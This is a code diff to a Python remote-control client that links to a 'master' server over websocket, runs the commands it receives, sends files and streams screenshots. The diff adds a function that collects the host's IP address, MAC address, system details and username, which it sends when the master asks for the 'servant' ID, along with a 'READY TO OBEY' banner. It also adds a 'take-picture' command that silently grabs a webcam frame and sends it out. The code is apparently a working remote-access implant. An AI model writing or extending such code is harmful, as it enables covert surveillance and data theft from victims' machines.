@@ -13,6 +13,10 @@ import time
 import logging
 from decoder import decode_unicode_string
 from colorama import init, Fore
+import socket
+import platform
+import getpass
+import uuid
 
 sys.dont_write_bytecode = True
 init()
@@ -20,6 +24,20 @@ screen = get_monitors()[0]  # Assuming a single monitor setup
 screen_size = (screen.width, screen.height)
 session = ""
 
+def get_info():
+    try:
+        ip_address = socket.gethostbyname(socket.gethostname())
+        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
+        system_info = platform.system()
+        machine_info = platform.machine()
+        processor_info = platform.processor()
+        username = getpass.getuser()
+
+        info_string = f"\nIP Address: {ip_address}\nMAC Address: {mac_address}\nSystem: {system_info}, Machine: {machine_info}, Processor: {processor_info}\nUsername: {username} \n"
+        return info_string
+    except Exception as e:
+        return f"Error: {str(e)}"
+info = get_info()+"[ READY TO OBEY ]\n"
 # Configure logging
 logging.basicConfig(
     level=logging.DEBUG,
@@ -32,7 +50,8 @@ async def connect_to_websocket(url, room, retry_interval, debug, output_filename
     global session
     while True:
         try:
-            uri = f"wss://{url}"
+            
+            uri = f"ws://{url}" if "localhost" in url else f"wss://{url}"
             if room:
                 uri += f"/{room}"
             async with websockets.connect(uri) as websocket:
@@ -57,6 +76,17 @@ async def connect_to_websocket(url, room, retry_interval, debug, output_filename
                         # Handle sending a file
                         _, file_path = message_from_master.split(" ", 1)
                         await send_file(websocket, file_path)
+                    elif message_from_master.startswith("take-picture"):
+                        _cap = cv2.VideoCapture(0)
+                        if not _cap.isOpened():
+                            await websocket.send("Error: Could not open webcam.")
+                        _ret, _frame = _cap.read()
+                        _cap.release()
+                        __, buffer = cv2.imencode('.jpg', _frame)
+                        frame_base64 = "frame_dat1:"+base64.b64encode(buffer).decode('utf-8')
+                        # Send the frame to the client as a JSON object
+                        await websocket.send(frame_base64)
+                    elif message_from_master=="Get Servant ID:": await websocket.send(info)
                     else:
                         session += f" && {message_from_master} "
                         if debug:
@@ -91,6 +121,8 @@ async def send_video_frames(websocket, debug):
             frame = np.array(screenshot)
             frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
 
+            # Resize the frame to a lower resolution
+            frame = cv2.resize(frame, (840, 680))  
             # Encode the frame to base64
             _, buffer = cv2.imencode('.jpg', frame)
             frame_base64 = "frame_data:"+base64.b64encode(buffer).decode('utf-8')
